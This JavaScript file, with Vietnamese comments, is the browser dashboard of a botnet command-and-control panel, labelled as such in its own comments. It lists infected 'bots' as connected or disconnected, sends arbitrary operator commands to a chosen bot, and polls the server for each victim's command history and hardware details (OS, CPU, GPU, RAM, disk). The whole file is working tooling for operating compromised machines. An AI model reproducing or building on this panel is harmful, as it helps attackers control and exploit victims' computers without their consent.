let currentSelectedAgent = null;

// Chọn agent từ danh sách bên trái
function selectAgent(bot_id) {
    currentSelectedAgent = bot_id;

    document.querySelectorAll('.agent-item').forEach(el => el.classList.remove('selected'));
    document.getElementById(`agent-${bot_id}`).classList.add('selected');

    document.getElementById('cmd-field').disabled = false;
    document.getElementById('cmd-btn').disabled = false;
    document.getElementById('cmd-field').placeholder = `> send to ${bot_id}...`;
    document.getElementById('cmd-field').focus();

    document.getElementById('terminal-out').textContent = `// Accessing data from: ${bot_id}...\n`;
}

// Gửi lệnh đến C2 server
document.getElementById('cmd-form').addEventListener('submit', function(e) {
    e.preventDefault();
    if (!currentSelectedAgent) return;

    const cmdInput = document.getElementById('cmd-field');
    const cmdText = cmdInput.value.trim();
    if (!cmdText) return;

    fetch('/api/send_command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target_bot: currentSelectedAgent, cmd: cmdText })
    }).then(() => {
        cmdInput.value = '';
    });
});

// Vòng lặp AJAX để đồng bộ hóa dữ liệu từ server mỗi 2 giây
setInterval(function() {
    fetch('/api/dashboard_data')
    .then(response => response.json())
    .then(data => {

        // Cập nhật nhật ký sự kiện trên bảng điều khiển phải
        let logHtml = "";
        data.logs.forEach(log => {
            logHtml += `<div class="ev-item"><div class="ev-time">LOG</div><div class="ev-msg">${log}</div></div>`;
        });
        document.getElementById('ev-log').innerHTML = logHtml;

        // Vẽ lại danh sách agent ở bên trái (hoạt động/không hoạt động)
        const onlineContainer = document.getElementById('online-agent-list');
        const offlineContainer = document.getElementById('offline-agent-list');
        onlineContainer.innerHTML = '';
        offlineContainer.innerHTML = '';

        let totalCount = 0;
        let onlineCount = 0;

        Object.keys(data.db).forEach(bot_id => {
            totalCount += 1;
            let isOnline = data.db[bot_id].status === 'online';
            if (isOnline) onlineCount += 1;

            let isSelected = (bot_id === currentSelectedAgent) ? 'selected' : '';
            let statusDot = isOnline ? 'dot-online' : 'dot-dead';
            let statusText = isOnline ? 'STATUS: CONNECTED' : 'STATUS: DISCONNECTED';

            let agentHtml = `
            <div class="agent-item ${isSelected}" id="agent-${bot_id}" onclick="selectAgent('${bot_id}')">
                <div class="agent-dot ${statusDot}"></div>
                <div class="agent-info">
                    <div class="agent-name">${bot_id}</div>
                    <div class="agent-ip" style="color: ${isOnline ? '#2a6a44' : '#ff4545'}">${statusText}</div>
                </div>
            </div>`;

            if (isOnline) {
                onlineContainer.insertAdjacentHTML('beforeend', agentHtml);
            } else {
                offlineContainer.insertAdjacentHTML('beforeend', agentHtml);
            }

            if (bot_id === currentSelectedAgent) {
                document.getElementById('cmd-field').disabled = !isOnline;
                document.getElementById('cmd-btn').disabled = !isOnline;
                document.getElementById('cmd-field').placeholder = isOnline ? `> send to ${bot_id}...` : `[!] TARGET OFFLINE`;
            }
        });

        document.getElementById('agent-total').innerText = totalCount;
        document.getElementById('agent-count').innerText = onlineCount;

        if (currentSelectedAgent && !data.db[currentSelectedAgent]) {
            currentSelectedAgent = null;
            document.getElementById('terminal-out').textContent = "// TARGET DISCONNECTED...";
            document.getElementById('cmd-field').disabled = true;
            document.getElementById('cmd-btn').disabled = true;
        }

        // Cập nhật terminal ở giữa (ngăn XSS và sửa lỗi cuộn)
        if (currentSelectedAgent && data.db[currentSelectedAgent]) {
            let termDiv = document.getElementById('terminal-out');
            let serverHistory = data.db[currentSelectedAgent].history;

            if (termDiv.textContent !== serverHistory) {
                let isAtBottom = Math.abs(termDiv.scrollHeight - termDiv.clientHeight - termDiv.scrollTop) <= 15;

                termDiv.textContent = serverHistory;

                if (isAtBottom) {
                    termDiv.scrollTop = termDiv.scrollHeight;
                }
            }
        }

        // Cập nhật thông tin mục tiêu và biểu đồ bên phải
        if (currentSelectedAgent && data.db[currentSelectedAgent]) {
            let agentData = data.db[currentSelectedAgent];
            let isOnline = agentData.status === 'online';

            document.getElementById('r-os').textContent = agentData.os_ver;
            document.getElementById('r-cpu').textContent = agentData.cpu_name;
            document.getElementById('r-gpu').textContent = agentData.gpu_name;
            document.getElementById('r-ram-tot').textContent = agentData.ram_total;
            document.getElementById('r-disk').textContent = agentData.disk_total;

            let cpu = isOnline ? (agentData.cpu || 0) : 0;
            let ram = isOnline ? (agentData.ram || 0) : 0;

            document.getElementById('b-cpu').style.width = cpu + '%';
            document.getElementById('v-cpu').textContent = cpu.toFixed(1) + '%';
            document.getElementById('b-cpu').className = 'bar-fill' + (cpu > 85 ? ' danger' : (cpu > 60 ? ' warn' : ''));

            document.getElementById('b-mem').style.width = ram + '%';
            document.getElementById('v-mem').textContent = ram.toFixed(1) + '%';
            document.getElementById('b-mem').className = 'bar-fill' + (ram > 85 ? ' danger' : (ram > 60 ? ' warn' : ''));

        } else {
            document.getElementById('b-cpu').style.width = '0%';
            document.getElementById('v-cpu').textContent = '0%';
            document.getElementById('b-cpu').className = 'bar-fill';

            document.getElementById('b-mem').style.width = '0%';
            document.getElementById('v-mem').textContent = '0%';
            document.getElementById('b-mem').className = 'bar-fill';

            document.getElementById('r-os').textContent = '--';
            document.getElementById('r-cpu').textContent = '--';
            document.getElementById('r-gpu').textContent = '--';
            document.getElementById('r-ram-tot').textContent = '--';
            document.getElementById('r-disk').textContent = '--';
        }
    });
}, 500);